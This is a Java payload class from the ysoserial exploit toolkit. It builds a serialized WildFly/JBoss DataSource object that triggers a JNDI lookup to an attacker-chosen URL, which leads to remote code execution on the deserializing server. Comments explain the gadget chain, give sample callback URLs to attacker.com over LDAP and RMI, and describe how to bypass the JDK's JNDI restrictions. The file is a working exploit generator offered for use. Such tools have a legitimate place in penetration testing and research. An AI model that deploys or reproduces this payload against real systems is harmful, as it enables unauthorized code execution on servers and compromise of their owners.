package ysoserial.payloads;

import javax.sql.DataSource;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Trivial JNDI lookup via WildFly/JBoss DataSource deserialization.
	The shortest known gadget chain — readObject() directly calls
	InitialContext.lookup() with attacker-controlled JNDI name.

	Gadget chain:
		ObjectInputStream.readObject()
			WildFlyDataSource.readObject()
				InitialContext.lookup(jndiName) → JNDI → RCE

	No intermediate chain links. Deserialization immediately triggers JNDI.

	Usage: command = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"
		     "rmi://attacker.com:1099/Exploit"

	JDK restrictions on JNDI:
		- JDK 8u121+: com.sun.jndi.rmi.object.trustURLCodebase=false
		- JDK 8u191+: com.sun.jndi.ldap.object.trustURLCodebase=false
		- Bypass: local factory gadgets (e.g., Tomcat BeanFactory)

	Only works against targets running WildFly/JBoss application server.

	Ref: Synacktiv "Finding gadgets like it's 2022"
	     ysoserial PR #177

	Requires:
		WildFly connector (org.wildfly:wildfly-connector) on target classpath
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.wildfly:wildfly-connector:26.0.1.Final"})
@Authors({ Authors.BOFEI_CHEN })
public class WildFly1 extends PayloadRunner implements ObjectPayload<DataSource> {

	public DataSource getObject(final String jndiUrl) throws Exception {
		// WildFlyDataSource has a custom readObject that calls:
		//   jndiName = (String) in.readObject();
		//   context.lookup(jndiName);
		// We create the object and set the jndiName field directly.
		final Class<?> clazz = Class.forName(
			"org.jboss.as.connector.subsystems.datasources.WildFlyDataSource");
		final Object ds = Reflections.createWithoutConstructor(clazz);

		// The jndiName field is read via in.readObject() in the custom readObject.
		// But WildFlyDataSource also has a delegate DataSource field set in readObject.
		// We only need jndiName to be set — the JNDI lookup fires on deser.
		Reflections.setFieldValue(ds, "jndiName", jndiUrl);

		return (DataSource) ds;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(WildFly1.class, args);
	}
}
